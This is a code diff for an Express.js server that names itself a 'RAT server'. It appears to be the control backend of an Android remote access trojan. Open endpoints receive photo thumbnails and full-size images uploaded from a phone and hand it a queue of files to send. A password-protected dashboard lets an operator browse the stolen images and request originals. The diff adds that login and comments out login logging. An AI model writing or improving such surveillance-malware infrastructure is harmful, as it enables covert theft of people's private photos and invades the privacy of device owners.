@@ -1,15 +1,51 @@
+require('dotenv').config();
 const express = require('express');
+const session = require('express-session');
 const cors = require('cors');
 const fs = require('fs');
 const path = require('path');
+const crypto = require('crypto');
 const app = express();
 const port = 5000;
+
+// ─── Auth config ────────────────────────────────────────────────────
+
+const ADMIN_USER = (process.env.ADMIN_USERNAME || '').trim();
+const ADMIN_PASS = (process.env.ADMIN_PASSWORD || '').trim();
+
+if (!ADMIN_USER || !ADMIN_PASS) {
+    console.error('❌ Missing ADMIN_USERNAME or ADMIN_PASSWORD in .env file');
+    process.exit(1);
+}
 
 // ─── Middleware ─────────────────────────────────────────────────────
 
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true }));
+app.use(session({
+    secret: crypto.randomBytes(32).toString('hex'),
+    resave: false,
+    saveUninitialized: false,
+    cookie: {
+        httpOnly: true,
+        maxAge: 24 * 60 * 60 * 1000  // 24 hours
+    }
+}));
+
+// ─── Auth middleware ────────────────────────────────────────────────
+
+function requireAuth(req, res, next) {
+    if (req.session && req.session.authenticated) {
+        return next();
+    }
+    // If requesting HTML page, redirect to login
+    if (req.accepts('html')) {
+        return res.redirect('/login');
+    }
+    // API calls get 401
+    res.status(401).json({ error: 'Unauthorized' });
+}
 
 // ─── Directories ────────────────────────────────────────────────────
 
@@ -18,9 +54,6 @@ const fullResDir = './full_res';
 
 if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
 if (!fs.existsSync(fullResDir)) fs.mkdirSync(fullResDir, { recursive: true });
-
-app.use('/uploads', express.static(uploadDir));
-app.use('/full_res', express.static(fullResDir));
 
 // ─── Request queue (in-memory + file persistence) ───────────────────
 
@@ -39,7 +72,38 @@ function saveRequests() {
     fs.writeFileSync(requestsFile, JSON.stringify(pendingRequests, null, 2));
 }
 
-// ─── API: Thumbnail upload ──────────────────────────────────────────
+// ─── Auth routes (public) ───────────────────────────────────────────
+
+app.get('/login', (req, res) => {
+    // If already logged in, redirect to dashboard
+    if (req.session && req.session.authenticated) {
+        return res.redirect('/');
+    }
+    res.sendFile(path.join(__dirname, 'web_ui', 'login.html'));
+});
+
+app.post('/auth/login', (req, res) => {
+    const { username, password } = req.body;
+    if (username === ADMIN_USER && password === ADMIN_PASS) {
+        req.session.authenticated = true;
+        // console.log('🔓 Dashboard login successful');
+        res.json({ success: true });
+    } else {
+        // console.log('🔒 Failed login attempt');
+        res.status(401).json({ success: false, error: 'Invalid credentials' });
+    }
+});
+
+app.post('/auth/logout', (req, res) => {
+    req.session.destroy();
+    res.json({ success: true });
+});
+
+// ─── Android client API (no auth required) ──────────────────────────
+
+app.get('/api/ping', (req, res) => {
+    res.json({ status: 'ok' });
+});
 
 app.post('/api/upload/thumbnail', (req, res) => {
     try {
@@ -57,15 +121,12 @@ app.post('/api/upload/thumbnail', (req, res) => {
             uploadedAt: new Date().toISOString()
         }, null, 2));
 
-        // console.log('📸 Thumbnail received:', filename);
         res.json({ success: true, filename });
     } catch (error) {
         console.error('Error uploading thumbnail:', error);
         res.status(500).json({ success: false, error: 'Failed to upload thumbnail' });
     }
 });
-
-// ─── API: Full-res image upload ─────────────────────────────────────
 
 app.post('/api/upload/fullsize', (req, res) => {
     try {
@@ -84,9 +145,20 @@ app.post('/api/upload/fullsize', (req, res) => {
     }
 });
 
-// ─── API: Thumbnail listing ─────────────────────────────────────────
+app.get('/api/requests', (req, res) => {
+    res.json({ requests: pendingRequests });
+});
 
-app.get('/api/thumbnails', (req, res) => {
+app.delete('/api/request/:filename', (req, res) => {
+    const filename = decodeURIComponent(req.params.filename);
+    pendingRequests = pendingRequests.filter(f => f !== filename);
+    saveRequests();
+    res.json({ success: true });
+});
+
+// ─── Dashboard API (auth required) ──────────────────────────────────
+
+app.get('/api/thumbnails', requireAuth, (req, res) => {
     try {
         const files = fs.readdirSync(uploadDir);
         const thumbnails = [];
@@ -122,13 +194,7 @@ app.get('/api/thumbnails', (req, res) => {
     }
 });
 
-// ─── API: Request queue ─────────────────────────────────────────────
-
-app.get('/api/requests', (req, res) => {
-    res.json({ requests: pendingRequests });
-});
-
-app.post('/api/request/:filename', (req, res) => {
+app.post('/api/request/:filename', requireAuth, (req, res) => {
     const filename = decodeURIComponent(req.params.filename);
     if (!pendingRequests.includes(filename)) {
         pendingRequests.push(filename);
@@ -138,22 +204,24 @@ app.post('/api/request/:filename', (req, res) => {
     res.json({ success: true, pending: pendingRequests.length });
 });
 
-app.delete('/api/request/:filename', (req, res) => {
-    const filename = decodeURIComponent(req.params.filename);
-    pendingRequests = pendingRequests.filter(f => f !== filename);
-    saveRequests();
-    res.json({ success: true });
+// ─── Dashboard (auth required) ─────────────────────────────────────
+
+app.use('/uploads', requireAuth, express.static(uploadDir));
+app.use('/full_res', requireAuth, express.static(fullResDir));
+
+app.get('/', requireAuth, (req, res) => {
+    res.sendFile(path.join(__dirname, 'web_ui', 'index.html'));
 });
 
-// ─── Dashboard (static files from ./web_ui) ────────────────────────
-
-app.use(express.static(path.join(__dirname, 'web_ui')));
-
+app.get('/style.css', requireAuth, (req, res) => {
+    res.sendFile(path.join(__dirname, 'web_ui', 'style.css'));
+});
 
 // ─── Server startup ─────────────────────────────────────────────────
 
 app.listen(port, '0.0.0.0', () => {
     console.log('🐀 RAT server running at http://localhost:' + port);
+    // console.log('🔐 Dashboard protected — login at /login');
 });
 
 process.on('SIGINT', () => {
